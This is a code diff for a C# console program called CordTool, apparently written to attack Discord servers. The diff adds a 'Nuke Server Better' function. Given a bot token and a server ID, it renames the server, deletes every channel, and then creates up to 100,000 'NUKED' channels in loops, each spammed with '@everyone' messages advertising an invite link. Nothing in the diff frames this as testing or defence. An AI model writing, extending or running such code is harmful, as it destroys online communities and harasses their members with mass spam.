@@ -4,6 +4,11 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Net.Http;
+using DSharpPlus;
+using DSharpPlus.CommandsNext;
+using System.Threading;
+using System.Security.Authentication;
+
 
 
 namespace CordTool
@@ -13,13 +18,13 @@ namespace CordTool
         static void Main(string[] args)
         {
             while (true)
-            { 
-            Console.Title = "CordTool";
-            Banner();
-            Menu();
-            ConsoleKeyInfo input = Console.ReadKey();
-            char option = input.KeyChar;
-            Console.WriteLine(option);
+            {
+                Console.Title = "CordTool";
+                Banner();
+                Menu();
+                ConsoleKeyInfo input = Console.ReadKey();
+                char option = input.KeyChar;
+                Console.WriteLine(option);
                 switch (option)
                 {
                     case '1':
@@ -27,8 +32,30 @@ namespace CordTool
                         Console.Clear();
                         Console.WriteLine("Message sent! Check your Discord client to check if it succeeded.");
                         break;
-                    case '4':
+                    case '5':
                         return;
+                    case '4':
+                        nukeServerBetter();
+                        Console.Clear();
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("N");
+                        Console.Clear();
+                        Thread.Sleep(900);
+                        Console.WriteLine("Nu");
+                        Console.Clear();
+                        Thread.Sleep(900);
+                        Console.WriteLine("Nuk");
+                        Console.Clear();
+                        Thread.Sleep(900);
+                        Console.WriteLine("Nuke");
+                        Console.Clear();
+                        Thread.Sleep(900);
+                        Console.WriteLine("Nuked");
+                        Console.Clear();
+                        Thread.Sleep(900);
+                        Console.WriteLine("Nuked!");
+                        Console.ResetColor();
+                        break;
                     case '2':
                         nukeServer();
                         Console.Clear();
@@ -37,11 +64,18 @@ namespace CordTool
                     case '3':
                         loginBot();
                         break;
-                }   
+                    case 'P':
+                        releaseNotes();
+                        break;
+                    case 'p':
+                        releaseNotes();
+                        break;
+                }
             }
         }
-    
-        static void Banner() {
+
+        static void Banner()
+        {
             Console.ForegroundColor = ConsoleColor.Magenta;
             Console.WriteLine(@"
 
@@ -63,14 +97,16 @@ namespace CordTool
             Console.ResetColor();
             Console.WriteLine("CordTool - A tool for managing and interacting with Discord webhooks.");
             Console.WriteLine("Developed by: Arran :)");
-            Console.WriteLine("Version: 1.0.0");
+            Console.WriteLine("Version: 2.0.0 (Release notes: Type 9)");
         }
         static void Menu()
         {
             Console.WriteLine("\n1. Send Webhook Message");
             Console.WriteLine("2. Nuke Server");
             Console.WriteLine("3. Login to a Bot");
-            Console.WriteLine("4. Exit");
+            Console.WriteLine("4. Nuke Server Better (Reccommended)");
+            Console.WriteLine("5. Exit");
+            Console.WriteLine("P. Release Notes");
         }
 
         static async void webhookMessage()
@@ -119,13 +155,109 @@ namespace CordTool
                 }
             }
 
-        
+
         }
 
         static async void loginBot()
         {
             Console.Clear();
             Console.WriteLine("The log into a bot feature is in developement. Maybe try upgrade CordTool? ");
+        }
+
+        static async void nukeServerBetter()
+        {
+            Console.Clear();
+            Console.Write("Bot Token: ");
+            string Token = Console.ReadLine();
+
+            Console.Write("Name override: ");
+            string serverNameOverRide = Console.ReadLine();
+
+            Console.Write("Server ID: ");
+            string guildId = Console.ReadLine();
+
+            Console.Write("Discord invite link: ");
+            string serverInvite = Console.ReadLine();
+            for (int i = 0; i < 1000000; i++)
+            {
+
+
+
+
+                var discord = new DiscordClient(new DiscordConfiguration()
+                {
+                    Token = Token,
+                    TokenType = TokenType.Bot
+                });
+
+                await discord.ConnectAsync();
+
+                var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
+                await guild.ModifyAsync(g => g.Name = serverNameOverRide);
+
+                await discord.DisconnectAsync();
+
+                Console.WriteLine("Something is happening in the Nuke function.");
+
+                var channels = await guild.GetChannelsAsync();
+                foreach (var channel in channels)
+                {
+                    try
+                    {
+                        await channel.DeleteAsync();
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Something is happening in the Nuke function.");
+                    }
+                }
+
+                for (int j = 0; j < 100000; j++)
+                {
+                    try
+                    {
+                        var channel = await guild.CreateTextChannelAsync($"NUKED-{j}");
+                        for (int k = 0; k < 5; k++)
+                        {
+                            await channel.SendMessageAsync($"NUKED BY {serverInvite} @everyone");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Something happened during the nuke, and we don't know how to fix it. Here's the error code: {ex.Message}");
+                    }
+                }
+            }
+        }
+        static void releaseNotes()
+        {
+            Console.Clear();
+            Console.WriteLine("Release Notes for CordTool");
+            Console.WriteLine("Type the version below.");
+            ConsoleKeyInfo input = Console.ReadKey();
+            char option = input.KeyChar;
+            Console.WriteLine(option);
+            switch (option)
+            {
+                case '1':
+                    Console.WriteLine("Version 1.0.0 - Initial release with basic features.");
+                    Console.WriteLine("There is 4 options: Nuke Server, Login to a bot, and send webhook message. The last is Exit, but that doesn't count.");
+                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/Discord/DiscordHatesMe.zip");
+                    Console.WriteLine("Click any key to exit.");
+                    Console.ReadKey();
+                    Console.Clear();
+                    break;
+                case '2':
+                    Console.WriteLine("Version 2.0.0 - Second release, not much.");
+                    Console.WriteLine("There is 6 options: Nuke Server, Login to a bot, Send webhook message, Nuke Server (Better), and the Release Notes. The last is Exit, but that doesn't count.");
+                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v2.0.0/Cordtool.zip");
+                    Console.WriteLine("This version is the one you are using right now.");
+                    Console.WriteLine("Click any key to exit.");
+                    Console.ReadKey();
+                    Console.Clear();
+                    break;
+            }
         }
     }
 }
